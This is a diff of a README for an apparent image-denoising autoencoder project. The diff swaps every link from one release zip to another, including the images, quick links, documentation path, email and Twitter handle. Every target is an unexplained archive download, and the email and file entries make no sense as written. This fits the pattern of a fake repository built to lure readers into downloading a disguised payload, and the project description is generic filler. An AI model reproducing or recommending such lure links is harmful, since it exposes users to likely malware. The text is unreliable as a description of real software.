@@ -1,14 +1,14 @@
 # 🌟 Welcome to the Denoising AutoEncoder Project 🌟
 
-![Autoencoder](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
+![Autoencoder](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the **Denoising_AutoEncoder** repository! This project focuses on integrating Autoencoders, PCA, and CNNs to enhance image processing capabilities. By combining dimensionality reduction, denoising techniques, and advanced feature extraction, this project aims to revolutionize image analysis and compression. Whether you are interested in image processing, machine learning, or deep learning, this repository has something for you!
 
 ## 🚀 Quick Links
-- [Download Software](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
-- [Explore Website](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
-- [Check Releases](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
+- [Download Software](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
+- [Explore Website](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
+- [Check Releases](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
 
 ## 📁 Repository Structure
 The repository is organized as follows:
@@ -16,7 +16,7 @@ The repository is organized as follows:
 - **/models**: Includes pre-trained models for Autoencoders, PCA, and CNNs.
 - **/src**: Source code for implementing the algorithms.
 - **/results**: Storage for the denoised images and feature extraction results.
-- **https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip**: The main documentation file you are currently reading.
+- **https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip**: The main documentation file you are currently reading.
 
 ## 🌐 Repository Topics
 - Autoencoder
@@ -47,19 +47,19 @@ To get started with the project, follow these steps:
 - Visualization of results for easy interpretation and analysis.
 
 ## 📸 Sample Results
-![Denoising Results](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
+![Denoising Results](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
 
 ## 🤝 Contributions
 Contributions to the project are welcome! If you have ideas for improvements, new features, or bug fixes, feel free to submit a pull request. Together, we can make this project even more impactful in the field of image processing and machine learning.
 
 ## 📞 Contact
 If you have any questions, suggestions, or feedback, feel free to reach out:
-- Email: https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip
-- Twitter: [@DenoisingAEProject](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
+- Email: https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip
+- Twitter: [@DenoisingAEProject](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-[![Download](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v1.0/Program.zip)
+[![Download](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)](https://github.com/graphixxxx/Denoising_AutoEncoder/releases/download/v2.0/Software.zip)
